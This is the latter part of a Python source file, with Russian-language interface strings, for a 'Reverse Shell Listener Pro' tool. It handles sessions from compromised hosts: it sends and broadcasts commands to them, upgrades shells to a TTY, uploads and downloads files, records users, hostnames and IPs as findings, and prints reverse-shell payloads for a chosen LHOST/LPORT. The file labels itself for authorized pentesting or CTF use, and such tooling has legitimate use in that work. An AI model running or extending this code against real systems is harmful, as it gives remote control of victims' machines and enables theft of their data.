                    console.print("[red]send <id> <cmd>[/red]")
                    continue
                s = listener.get(int(sp[0]))
                if s:
                    try:
                        s.send(sp[1])
                        time.sleep(0.6)
                        console.print(s.read() or "")
                    except Exception as exc:
                        console.print(f"[red]{exc}[/red]")
                continue
            if cmd == "broadcast":
                if not arg:
                    console.print("[red]broadcast <cmd>[/red]")
                    continue
                n = listener.broadcast(arg)
                console.print(f"[green]✓ Отправлено {n} сессиям[/green]")
                continue
            if cmd == "label":
                sp = arg.split(None, 1)
                if len(sp) < 2 or not sp[0].isdigit():
                    console.print("[red]label <id> <text>[/red]")
                    continue
                s = listener.get(int(sp[0]))
                if s:
                    s.label = sp[1][:40]
                    console.print(f"[green]✓ #{s.sid} → '{s.label}'[/green]")
                continue
            if cmd == "tag":
                sp = arg.split(None, 1)
                if len(sp) < 2 or not sp[0].isdigit():
                    console.print("[red]tag <id> <tag>[/red]")
                    continue
                s = listener.get(int(sp[0]))
                if s:
                    s.tags.add(sp[1])
                    console.print(f"[green]✓ #{s.sid} tags: "
                                  f"{','.join(s.tags)}[/green]")
                continue
            if cmd == "tty":
                if not arg.isdigit():
                    console.print("[red]tty <id>[/red]")
                    continue
                s = listener.get(int(arg))
                if s:
                    try:
                        s.send(TTY_UPGRADE_CMDS["linux_python3"])
                        time.sleep(0.5)
                        console.print("[green]→ TTY upgrade отправлен[/green]")
                    except Exception as exc:
                        console.print(f"[red]{exc}[/red]")
                continue
            if cmd == "tty-all":
                n = listener.broadcast(TTY_UPGRADE_CMDS["linux_python3"])
                console.print(f"[green]✓ TTY upgrade отправлен "
                              f"{n} сессиям[/green]")
                continue
            if cmd == "info":
                if not arg.isdigit():
                    continue
                s = listener.get(int(arg))
                if s:
                    _session_info(s)
                continue
            if cmd == "findings":
                if not arg.isdigit():
                    continue
                s = listener.get(int(arg))
                if s:
                    _print_findings(s)
                continue
            if cmd == "note":
                if not arg.isdigit():
                    continue
                s = listener.get(int(arg))
                if s:
                    _save_finding(ShellFinding(
                        kind="active_session",
                        severity="high",
                        title=f"Active shell session #{s.sid}",
                        target=f"{s.addr[0]}:{s.addr[1]}",
                        evidence=(f"OS: {s._os_hint}\n"
                                  f"Users: {list(s.findings.get('users') or [])}\n"
                                  f"Hostname: {s.findings.get('hostname')}\n"
                                  f"IPs: {list(s.findings.get('ips') or [])}"),
                        data={"sid": s.sid, "addr": f"{s.addr[0]}:{s.addr[1]}"},
                    ))
                continue
            if cmd == "kill":
                if not arg.isdigit():
                    continue
                if listener.remove(int(arg)):
                    console.print(f"[green]✓ #{arg} закрыта.[/green]")
                    if current == int(arg):
                        current = None
                continue
            if cmd == "kill-all":
                if Confirm.ask("Закрыть все сессии?", default=False):
                    for s in listener.list():
                        listener.remove(s.sid)
                    current = None
                continue
            if cmd == "logs":
                if not arg.isdigit():
                    continue
                s = listener.get(int(arg))
                if s:
                    console.print(f"[cyan]{s.log_file}[/cyan]")
                continue
            if cmd == "cast":
                if not arg.isdigit():
                    continue
                s = listener.get(int(arg))
                if s:
                    console.print(f"[cyan]asciinema: {s.asciinema_file}"
                                  f"[/cyan]")
                    console.print(f"[dim]Play: asciinema play "
                                  f"{s.asciinema_file}[/dim]")
                continue
            if cmd == "history":
                if not arg.isdigit():
                    continue
                s = listener.get(int(arg))
                if s:
                    for ts, c in s.commands[-30:]:
                        console.print(f"  [dim]"
                                      f"{ts.strftime('%H:%M:%S')}[/dim] "
                                      f"[green]{c}[/green]")
                continue
            if cmd == "search":
                if not arg:
                    continue
                found = 0
                for s in listener.list():
                    for ts, c in s.commands:
                        if arg.lower() in c.lower():
                            console.print(
                                f"  [cyan]#{s.sid}[/cyan] "
                                f"[dim]{ts.strftime('%H:%M:%S')}[/dim] "
                                f"[green]{c}[/green]")
                            found += 1
                console.print(f"[dim]Найдено: {found}[/dim]")
                continue
            if cmd == "upload":
                sp = arg.split()
                if len(sp) < 2 or not sp[0].isdigit():
                    console.print("[red]upload <id> <local> [remote][/red]")
                    continue
                s = listener.get(int(sp[0]))
                if s:
                    remote = sp[2] if len(sp) > 2 else "/tmp/f"
                    if s.upload_b64(sp[1], remote):
                        console.print(f"[green]✓ Uploaded to {remote}[/green]")
                continue
            if cmd == "download":
                sp = arg.split()
                if len(sp) < 2 or not sp[0].isdigit():
                    console.print("[red]download <id> <remote> [local][/red]")
                    continue
                s = listener.get(int(sp[0]))
                if s:
                    local = sp[2] if len(sp) > 2 else None
                    if s.download_b64(sp[1], local):
                        pass
                continue
            if cmd == "payload":
                sp = arg.split()
                lh = sp[0] if len(sp) > 0 else "LHOST"
                lp = sp[1] if len(sp) > 1 else str(port)
                show_payloads(lh, lp)
                continue
            if cmd == "export":
                fmt = arg or "json"
                export_sessions(listener.list(), fmt=fmt)
                continue
            if cmd == "shortcuts":
                t = Table(title="⚡ Shortcuts")
                t.add_column("Key", style="cyan", width=8)
                t.add_column("Command", style="green")
                for k, v in SHORTCUTS.items():
                    t.add_row(k, v)
                console.print(t)
                continue

            console.print(f"[red]Неизвестная команда: {cmd}[/red]")
    finally:
        listener.stop()
        console.print("[yellow]Listener остановлен.[/yellow]")


# ===========================================================================
# CLI-обёртки (сохранены)
# ===========================================================================

def cli_repl(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
    repl(host, port, auto_commands=list(AUTO_COMMANDS))


def cli_repl_no_auto(host: str = DEFAULT_HOST,
                     port: int = DEFAULT_PORT) -> None:
    repl(host, port, auto_commands=None)


def cli_repl_win(host: str = DEFAULT_HOST,
                 port: int = DEFAULT_PORT) -> None:
    repl(host, port, auto_commands=list(AUTO_COMMANDS_WIN))


def show_shortcuts() -> None:
    t = Table(title="⚡ Shortcuts")
    t.add_column("Key", style="cyan", width=8)
    t.add_column("Command", style="green")
    for k, v in SHORTCUTS.items():
        t.add_row(k, v)
    console.print(t)


def show_listener_help() -> None:
    console.print(HELP_TEXT)


def cli_payloads(lhost: str = "LHOST", lport: int = 4444) -> None:
    show_payloads(lhost, lport)


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🐚 Reverse Shell Listener Pro[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Запустить listener (Linux auto-commands)"),
        ("2", "Запустить listener (Windows auto-commands)"),
        ("3", "Запустить listener (без автокоманд)"),
        ("4", "Показать шорткаты"),
        ("5", "Показать help"),
        ("6", "Показать payload'ы (reverse shells)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного пентеста / CTF.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c in ("1", "2", "3"):
        port = IntPrompt.ask("Порт", default=DEFAULT_PORT)
        host = Prompt.ask("Host", default=DEFAULT_HOST)
        if c == "1":
            repl(host, port, list(AUTO_COMMANDS))
        elif c == "2":
            repl(host, port, list(AUTO_COMMANDS_WIN))
        else:
            repl(host, port, None)
    elif c == "4":
        show_shortcuts()
    elif c == "5":
        show_listener_help()
    elif c == "6":
        lh = Prompt.ask("LHOST", default="10.0.0.1")
        lp = IntPrompt.ask("LPORT", default=4444)
        show_payloads(lh, lp)